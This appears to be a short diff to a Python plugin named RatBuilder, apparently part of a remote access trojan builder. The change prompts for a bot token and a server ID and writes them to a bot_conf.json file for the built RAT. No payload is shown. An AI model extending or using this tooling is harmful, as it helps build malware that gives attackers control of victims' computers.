@@ -1,6 +1,7 @@
 from colorama import Fore
 from utils.Plugin.PluginABC import PluginABC
 import importlib
+import json
 
 from utils.Setting.setup_most import TokenValidator
 
@@ -534,12 +535,13 @@ class RatBuilder(PluginABC):
 
         token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 봇 토큰: ')
         await TokenValidator(token)
+        guild_id = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 서버 아이디: ')
 
         f = open("../../dist/rat/bot_conf.json", "w")
-        f.write(json.dumps({
+        f.write(json.dumps({ # tabnine으로 자동완성된 코드 부분
             "token": token,
-            "option": option
-        }))
+            "guild_id": guild_id
+        })) # tabnine 은 코드 자동완성 도우미임
         f.close()
 
         if option == 1:
